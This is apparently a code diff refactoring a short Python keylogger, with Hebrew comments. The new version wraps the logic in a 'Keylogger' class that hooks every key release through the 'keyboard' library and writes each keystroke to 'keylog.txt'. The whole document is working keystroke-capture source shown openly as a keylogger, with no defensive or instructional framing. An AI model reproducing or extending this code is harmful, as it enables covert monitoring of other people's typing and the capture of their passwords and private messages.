@@ -1,16 +1,20 @@
 import keyboard
 
+class Keylogger():
+    def __init__(self, FileName):
+        self.file = open(FileName, "w")
+    def callback(self, event):
+        print(event.name)
+        if event.name == "space":
+            self.file.write(" ")
+        else:
+            self.file.write(event.name)
+        self.file.flush()
 
-out_file = open("secret_key.txt", "w") # יוצר קובץ חדש 
+    def start_log(self):
+        keyboard.on_release(callback= self.callback) # שמקש נלחץ תקרא לפונקציה new key
+        keyboard.wait()
+        
 
-def new_key(event):
-    print(event.name)
-    if event.name == "space":
-        out_file.write(" ")
-    else:
-        out_file.write(event.name)
-    out_file.flush()
-
-
-keyboard.on_release(callback=new_key) # שמקש נלחץ תקרא לפונקציה new key
-keyboard.wait()
+Keylogger_object = Keylogger("keylog.txt")
+Keylogger_object.start_log()
